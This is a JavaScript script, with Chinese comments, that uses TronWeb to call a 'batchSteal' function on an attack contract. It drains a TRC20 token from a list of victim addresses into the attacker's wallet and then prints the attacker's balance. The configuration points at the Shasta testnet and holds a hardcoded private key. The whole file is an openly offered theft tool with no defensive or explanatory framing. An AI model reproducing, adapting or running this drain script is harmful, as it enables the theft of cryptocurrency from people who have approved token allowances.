// batchStealTRC20.js
const TronWeb = require("tronweb");

// ========== 配置 ==========
const ATTACK_CONTRACT = "TYKsGMu19ACE4XZgU5NdYiFg1QXPkHG6zA";      // 攻击合约地址
const TOKEN_ADDRESS = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";      // Shasta 测试 USDT
const ATTACKER_PRIVATE_KEY = "b2d2d3c2d2b68a93ddd731a06292070ef65d92925028142ff227451bd15e553c";          // ⚠️ 替换为攻击者的私钥
const fullNode = "https://api.shasta.trongrid.io";
const solidityNode = "https://api.shasta.trongrid.io";
const eventServer = "https://api.shasta.trongrid.io";

// 受害者地址列表（可手动添加或从数据库读取）
const victims = [
    "受害者地址1",
    "受害者地址2"
    // 可以继续添加更多受害者
];

// ========== 主逻辑 ==========
const tronWeb = new TronWeb(fullNode, solidityNode, eventServer, ATTACKER_PRIVATE_KEY);

const attackABI = [
    {
        "inputs": [
            {"name": "token", "type": "address"},
            {"name": "victims", "type": "address[]"}
        ],
        "name": "batchSteal",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];
const attackContract = await tronWeb.contract(attackABI, ATTACK_CONTRACT);

async function stealAll() {
    console.log(`开始批量盗取，共 ${victims.length} 个地址`);
    const result = await attackContract.batchSteal(TOKEN_ADDRESS, victims).send();
    console.log("盗取交易hash:", result);
    
    // 查询攻击者余额
    const tokenContract = await tronWeb.contract().at(TOKEN_ADDRESS);
    const balance = await tokenContract.balanceOf(tronWeb.defaultAddress.base58).call();
    console.log("攻击者当前余额:", balance.toString());
}

stealAll().catch(console.error);
